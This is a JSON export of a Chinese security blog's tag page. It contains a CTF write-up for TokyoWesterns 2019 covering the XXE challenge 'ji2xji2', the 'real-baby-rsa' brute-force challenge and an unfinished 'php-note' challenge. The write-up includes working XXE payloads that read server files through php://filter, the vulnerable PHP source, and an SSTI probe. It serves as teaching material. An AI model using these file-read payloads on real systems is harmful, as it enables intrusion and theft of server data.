{"name":"SSTI","slug":"SSTI","count":2,"postlist":[{"title":"SSTI-服务器端模板注入","slug":"SSTI","date":"2019-08-30T07:28:13.000Z","updated":"2019-09-10T10:13:55.250Z","comments":true,"path":"api/articles/SSTI.json","excerpt":"<p>终于到了学习SSTI的时间呢！</p>","keywords":null,"cover":"http://rickgray.me/images/articles/2015-11-03-server-side-template-injection-attack-to-smarty/5.png","content":null,"text":"终于到了学习SSTI的时间呢！SSTI-服务器端模板注入8/30/2019 3:28:13 PM 注入原理使用PHP模板引擎Twig作例子演示注入原理&lt;?phprequire_once dirname(__FILE__).&apos;/../lib/Twig/Autoloa","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"SSTI","slug":"SSTI","count":2,"path":"api/tags/SSTI.json"}]},{"title":"TokyoWestern 2019","slug":"TokyoWesterns-2019","date":"2019-09-05T09:20:26.000Z","updated":"2019-09-11T04:43:53.977Z","comments":true,"path":"api/articles/TokyoWesterns-2019.json","excerpt":"","keywords":null,"cover":"http://wx3.sinaimg.cn/mw690/006boCb9ly1g6vh6cdqqvj31d60dmwj2.jpg","content":"<h1 id=\"TokyoWestern-2019\"><a href=\"#TokyoWestern-2019\" class=\"headerlink\" title=\"TokyoWestern 2019\"></a>TokyoWestern 2019</h1><p>9/5/2019 5:20:26 PM 🎨</p>\n<h2 id=\"ji2xji2\"><a href=\"#ji2xji2\" class=\"headerlink\" title=\"ji2xji2\"></a>ji2xji2</h2><p>拿到题目第一反应就是XXE，直接拿着之前博客的payload一顿试，结果得到了<code>failed to decode xml</code>，然后就在想是不是思路错了，没想到是读的文件不存在，其实拿最简单的</p>\n<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;\n&lt;!DOCTYPE foo [\n&lt;!ELEMENT foo ANY &gt;\n&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;\n&lt;creds&gt;\n&lt;user&gt;&amp;xxe;&lt;/user&gt;\n&lt;pass&gt;mypass&lt;/pass&gt;\n&lt;/creds&gt;</code></pre><p>就能看出来可以解析，因为觉得不可能这么简单就没有试…</p>\n<p>读源码</p>\n<pre><code>&lt;?xml version=&apos;1.0&apos;?&gt;\n&lt;!DOCTYPE mail[\n&lt;!ENTITY hacker SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt;\n]&gt;\n\n&lt;mail&gt;\n    &lt;message&gt;&amp;hacker;&lt;/message&gt;\n&lt;/mail&gt;</code></pre><p>这里我们要注意得到的加密后的数据在哪里结束</p>\n<p><img src=\"http://wx3.sinaimg.cn/mw690/006boCb9ly1g6vh6cdqqvj31d60dmwj2.jpg\" alt=\"读源码\"></p>\n<p>得到源码，从第一句得到<strong>flag</strong>的位置</p>\n<pre><code>&lt;?php\n**include &apos;flag.php&apos;;**\n\n$method = $_SERVER[&apos;REQUEST_METHOD&apos;];\n\nfunction die404($msg) {\n  http_response_code(404);\n  die($msg);\n}\n\nfunction check_type($obj) {\n  if (is_array($obj)) {\n    $key_is_str = function($obj) {\n      foreach($obj as $key=&gt;$val) {\n        if (is_int($key))\n          return false;\n      }\n      return true;\n    };\n\n    if ($key_is_str($obj)) {\n      return &apos;object&apos;;\n    }\n    else {\n      return &apos;array&apos;;\n    }\n  }\n  else {\n    return gettype($obj);\n  }\n}\n\nfunction json2xml($obj) {\n  $res = &apos;&apos;;\n\n  if (is_array($obj)) {\n    foreach($obj as $key =&gt; $val) {\n      switch(check_type($val)) {\n        case &apos;array&apos;:\n          foreach($val as $v) {\n            $res .= &quot;&lt;$key&gt;&quot;;\n            $res .= json2xml($v);\n            $res .= &quot;&lt;/$key&gt;&quot;;\n          }\n          break;\n        default: // object or primitive\n          $res .= &quot;&lt;$key&gt;&quot;;\n          $res .= json2xml($val);\n          $res .= &quot;&lt;/$key&gt;&quot;;\n          break;\n      }\n    }\n  }\n  else {\n    $res = (string)$obj;\n  }\n  return $res;\n}\n\n\nif ($method === &apos;POST&apos;) {\n  $jsonstr = $_POST[&apos;json&apos;];\n  $xmlstr = $_POST[&apos;xml&apos;];\n\n  if (!(empty($xmlstr) ^ empty($jsonstr))) {\n    die404(&apos;404&apos;);\n  }\n\n  if (!empty($jsonstr)) {\n    $obj = json_decode($jsonstr, true);\n    if (empty($obj)) {\n      die(&apos;failed to decode json&apos;);\n    }\n    $doc = new DOMDocument(&apos;1.0&apos;);\n    $doc-&gt;formatOutput = true;\n    $_obj = array();\n    $_obj[&apos;root&apos;] = $obj;\n    $doc-&gt;loadXML(json2xml($_obj));\n    echo $doc-&gt;saveXML();\n  }\n\n  if (!empty($xmlstr)) {\n    libxml_disable_entity_loader(false);\n    $obj = simplexml_load_string($xmlstr, &apos;SimpleXMLElement&apos;, LIBXML_NOENT);\n    if (empty($obj)) {\n      die(&apos;failed to decode xml&apos;);\n    }\n    echo json_encode($obj, JSON_PRETTY_PRINT);\n  }\n}\nelse {\n?&gt;\n&lt;!doctype html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;title&gt;JSON &lt;-&gt; XML Converter&lt;/title&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;textarea id=&quot;json&quot; name=&quot;json&quot; rows=&quot;50&quot; cols=&quot;80&quot;&gt;\n    &lt;/textarea&gt;\n\n    &lt;input type=&quot;button&quot; id=&quot;x2j&quot; value=&quot;&lt;-&quot;/&gt;\n    &lt;input type=&quot;button&quot; id=&quot;j2x&quot; value=&quot;-&gt;&quot;/&gt;\n\n    &lt;textarea id=&quot;xml&quot; name=&quot;xml&quot; rows=&quot;50&quot; cols=&quot;80&quot;&gt;\n    &lt;/textarea&gt;\n\n    &lt;script\n      src=&quot;https://code.jquery.com/jquery-3.2.1.min.js&quot;\n      integrity=&quot;sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=&quot;\n      crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;\n    &lt;script&gt;\n      $.get(&apos;/sample.json&apos;, function(data) {\n        $(&apos;#json&apos;).val(data);\n      }, &apos;text&apos;);\n\n      $(&apos;#j2x&apos;).on(&apos;click&apos;, function() {\n        $.post(&apos;/&apos;, {\n          json: $(&apos;#json&apos;).val()\n        }, function(data) {\n          $(&apos;#xml&apos;).val(data);\n        });\n      });\n\n      $(&apos;#x2j&apos;).on(&apos;click&apos;, function() {\n        $.post(&apos;/&apos;, {\n          xml: $(&apos;#xml&apos;).val()\n        }, function(data) {\n          $(&apos;#json&apos;).val(data);\n        });\n      });\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;</code></pre><p>读flag</p>\n<pre><code>&lt;?xml version=&apos;1.0&apos;?&gt;\n&lt;!DOCTYPE mail[\n&lt;!ENTITY hacker SYSTEM &quot;php://filter/convert.base64-encode/resource=flag.php&quot;&gt;\n]&gt;\n\n&lt;mail&gt;\n    &lt;message&gt;&amp;hacker;&lt;/message&gt;\n&lt;/mail&gt;</code></pre><p>解密即可<br>    {<br>        “message”: “PD9waHAKJGZsYWcgPSAnVFdDVEZ7dDFueV9YWEVfc3QxbGxfZXgxc3RzX2V2ZXJ5d2hlcmV9JzsK”<br>    }</p>\n<pre><code>$flag = &apos;TWCTF{t1ny_XXE_st1ll_ex1sts_everywhere}&apos;;</code></pre><h2 id=\"real-baby-rsa\"><a href=\"#real-baby-rsa\" class=\"headerlink\" title=\"real-baby-rsa\"></a>real-baby-rsa</h2><p>告诉了我们N,e以及所有加密后的密文，直接爆破。(做的时候又是那样想的：怎么可能这么简单！(这么简单开始的时候还不知道替换掉换行符，搞了半天没做成😔(；′⌒`)))</p>\n<pre><code>#flag = &apos;TWCTF{CENSORED}&apos;\n#print(flag)\n# Public Parameters\nN = 36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091\ne = 65537\n\n\n# Encrypt the flag!\n\n#for i in flag1:\nfor char in flag:\n    print(pow(ord(char), e, N))</code></pre><p>解密脚本：</p>\n<pre><code>import string\n#flag = &apos;TWCTF{CENSORED}&apos;\n\nflag = string.letters+string.digits+&quot;!@#$%^&amp;*()/{}_&quot;\n#print(flag)\n# Public Parameters\nN = 36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091\ne = 65537\n\ncontent = open(&quot;output&quot;).readlines()\n\nfor line in content:\n    line = line.replace(&apos;\\n&apos;, &apos;&apos;)\n    for char in flag:\n        #print char\n        #print(pow(ord(char), e, N))\n        m = pow(ord(char), e, N)\n        #print(m)\n        #print(line)\n        if str(m) == str(line):\n            #print(m)\n            print(char),\n            break</code></pre><p>再贴一个国外师傅写的，看起来就是比上面的优雅一点😀，别问为什么贴两个？问就是喜欢收集！</p>\n<pre><code>N = 36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091\ne = 65537\n\n#create ist ascii char\nlist_ascii = []\nfor i in range(33,126):\n    list_ascii.append(chr(i))\n\n#read each part of cipher text in to list\nlineList = list()\nlineList = [line.rstrip(&apos;\\n&apos;) for line in open(&quot;output&quot;)]\n\n#starting burte force\n\nmesg = &quot;&quot;\n\nfor cir in range(0,len(lineList)):\n    for m in list_ascii:\n        test_str = pow(ord(m),e,N)\n        test_str = str(test_str)\n        if(lineList[cir] in test_str):\n            mesg += m\n            break\nprint(mesg)</code></pre><h2 id=\"php-note\"><a href=\"#php-note\" class=\"headerlink\" title=\"php-note\"></a>php-note</h2><pre><code>first name :1\nlastname: {{2*2}}</code></pre><p><img src=\"http://wx3.sinaimg.cn/mw690/006boCb9ly1g6vh6ett6fj30pe0d1wep.jpg\" alt=\"登陆成功\"></p>\n<p>查看源码得到hint:<code>http://phpnote.chal.ctf.westerns.tokyo/?action=source</code></p>\n<p>读源码</p>\n<pre><code> &lt;?php\ninclude &apos;config.php&apos;;\n\nclass Note {\n    public function __construct($admin) {\n        $this-&gt;notes = array();\n        $this-&gt;isadmin = $admin;\n    }\n\n    public function addnote($title, $body) {\n        array_push($this-&gt;notes, [$title, $body]);\n    }\n\n    public function getnotes() {\n        return $this-&gt;notes;\n    }\n\n    public function getflag() {\n        if ($this-&gt;isadmin === true) {\n            echo FLAG;\n        }\n    }\n}\n\nfunction verify($data, $hmac) {\n    $secret = $_SESSION[&apos;secret&apos;];\n    if (empty($secret)) return false;\n    return hash_equals(hash_hmac(&apos;sha256&apos;, $data, $secret), $hmac);\n}\n\nfunction hmac($data) {\n    $secret = $_SESSION[&apos;secret&apos;];\n    if (empty($data) || empty($secret)) return false;\n    return hash_hmac(&apos;sha256&apos;, $data, $secret);\n}\n\nfunction gen_secret($seed) {\n    return md5(SALT . $seed . PEPPER);\n}\n\nfunction is_login() {\n    return !empty($_SESSION[&apos;secret&apos;]);\n}\n\nfunction redirect($action) {\n    header(&quot;Location: /?action=$action&quot;);\n    exit();\n}\n\n$method = $_SERVER[&apos;REQUEST_METHOD&apos;];\n$action = $_GET[&apos;action&apos;];\n\nif (!in_array($action, [&apos;index&apos;, &apos;login&apos;, &apos;logout&apos;, &apos;post&apos;, &apos;source&apos;, &apos;getflag&apos;])) {\n    redirect(&apos;index&apos;);\n}\n\nif ($action === &apos;source&apos;) {\n    highlight_file(__FILE__);\n    exit();\n}\n\n\nsession_start();\n\nif (is_login()) {\n    $realname = $_SESSION[&apos;realname&apos;];\n    $nickname = $_SESSION[&apos;nickname&apos;];\n\n    $note = verify($_COOKIE[&apos;note&apos;], $_COOKIE[&apos;hmac&apos;])\n            ? unserialize(base64_decode($_COOKIE[&apos;note&apos;]))\n            : new Note(false);\n}\n\nif ($action === &apos;login&apos;) {\n    if ($method === &apos;POST&apos;) {\n        $nickname = (string)$_POST[&apos;nickname&apos;];\n        $realname = (string)$_POST[&apos;realname&apos;];\n\n        if (empty($realname) || strlen($realname) &lt; 8) {\n            die(&apos;invalid name&apos;);\n        }\n\n        $_SESSION[&apos;realname&apos;] = $realname;\n        if (!empty($nickname)) {\n            $_SESSION[&apos;nickname&apos;] = $nickname;\n        }\n        $_SESSION[&apos;secret&apos;] = gen_secret($nickname);\n    }\n    redirect(&apos;index&apos;);\n}\n\nif ($action === &apos;logout&apos;) {\n    session_destroy();\n    redirect(&apos;index&apos;);\n}\n\nif ($action === &apos;post&apos;) {\n    if ($method === &apos;POST&apos;) {\n        $title = (string)$_POST[&apos;title&apos;];\n        $body = (string)$_POST[&apos;body&apos;];\n        $note-&gt;addnote($title, $body);\n        $data = base64_encode(serialize($note));\n        setcookie(&apos;note&apos;, (string)$data);\n        setcookie(&apos;hmac&apos;, (string)hmac($data));\n    }\n    redirect(&apos;index&apos;);\n}\n\nif ($action === &apos;getflag&apos;) {\n    $note-&gt;getflag();\n}\n\n?&gt;\n&lt;!doctype html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;title&gt;PHP note&lt;/title&gt;\n    &lt;/head&gt;\n    &lt;style&gt;\n        textarea {\n            resize: none;\n            width: 300px;\n            height: 200px;\n        }\n    &lt;/style&gt;\n    &lt;body&gt;\n        &lt;?php\n        if (!is_login()) {\n            $realname = htmlspecialchars($realname);\n            $nickname = htmlspecialchars($nickname);\n        ?&gt;\n        &lt;form action=&quot;/?action=login&quot; method=&quot;post&quot; id=&quot;login&quot;&gt;\n            &lt;input type=&quot;text&quot; id=&quot;firstname&quot; placeholder=&quot;First Name&quot;&gt;\n            &lt;input type=&quot;text&quot; id=&quot;lastname&quot; placeholder=&quot;Last Name&quot;&gt;\n            &lt;input type=&quot;text&quot; name=&quot;nickname&quot; id=&quot;nickname&quot; placeholder=&quot;nickname&quot;&gt;\n            &lt;input type=&quot;hidden&quot; name=&quot;realname&quot; id=&quot;realname&quot;&gt;\n            &lt;button type=&quot;submit&quot;&gt;Login&lt;/button&gt;\n        &lt;/form&gt;\n        &lt;?php\n        } else {\n        ?&gt;\n        &lt;h1&gt;Welcome, &lt;?=$realname?&gt;&lt;?= !empty($nickname) ? &quot; ($nickname)&quot; : &quot;&quot; ?&gt;&lt;/h1&gt;\n        &lt;a href=&quot;/?action=logout&quot;&gt;logout&lt;/a&gt;\n        &lt;!-- &lt;a href=&quot;/?action=source&quot;&gt;source&lt;/a&gt; --&gt;\n        &lt;br/&gt;\n        &lt;br/&gt;\n        &lt;?php\n            foreach($note-&gt;getnotes() as $k =&gt; $v) {\n                list($title, $body) = $v;\n                $title = htmlspecialchars($title);\n                $body = htmlspecialchars($body);\n        ?&gt;\n        &lt;h2&gt;&lt;?=$title?&gt;&lt;/h2&gt;\n        &lt;p&gt;&lt;?=$body?&gt;&lt;/p&gt;\n        &lt;?php\n            }\n        ?&gt;\n        &lt;form action=&quot;/?action=post&quot; method=&quot;post&quot;&gt;\n            &lt;input type=&quot;text&quot; name=&quot;title&quot; placeholder=&quot;title&quot;&gt;\n            &lt;br&gt;\n            &lt;textarea name=&quot;body&quot; placeholder=&quot;body&quot;&gt;&lt;/textarea&gt;\n            &lt;button type=&quot;submit&quot;&gt;Post&lt;/button&gt;\n        &lt;/form&gt;\n        &lt;?php\n        }\n        ?&gt;\n        &lt;?php\n        ?&gt;\n        &lt;script&gt;\n            document.querySelector(&quot;form#login&quot;).addEventListener(&apos;submit&apos;, (e) =&gt; {\n                const nickname = document.querySelector(&quot;input#nickname&quot;)\n                const firstname = document.querySelector(&quot;input#firstname&quot;)\n                const lastname = document.querySelector(&quot;input#lastname&quot;)\n                document.querySelector(&quot;input#realname&quot;).value = `${firstname.value} ${lastname.value}`\n                if (nickname.value.length == 0 &amp;&amp; firstname.value.length &gt; 0 &amp;&amp; lastname.value.length &gt; 0) {\n                    nickname.value = firstname.value.toLowerCase()[0] + lastname.value.toLowerCase()\n                }\n            })\n        &lt;/script&gt;\n    &lt;/body&gt;\n&lt;/html&gt; </code></pre><p>没做完，先留坑</p>\n","text":"TokyoWestern 20199/5/2019 5:20:26 PM 🎨ji2xji2拿到题目第一反应就是XXE，直接拿着之前博客的payload一顿试，结果得到了failed to decode xml，然后就在想是不是思路错了，没想到是读的文件不存在，其实拿最简单的&l","link":"","raw":null,"photos":[],"categories":[{"name":"WP","slug":"WP","count":7,"path":"api/categories/WP.json"}],"tags":[{"name":"SSTI","slug":"SSTI","count":2,"path":"api/tags/SSTI.json"},{"name":"RSA","slug":"RSA","count":4,"path":"api/tags/RSA.json"}]}]}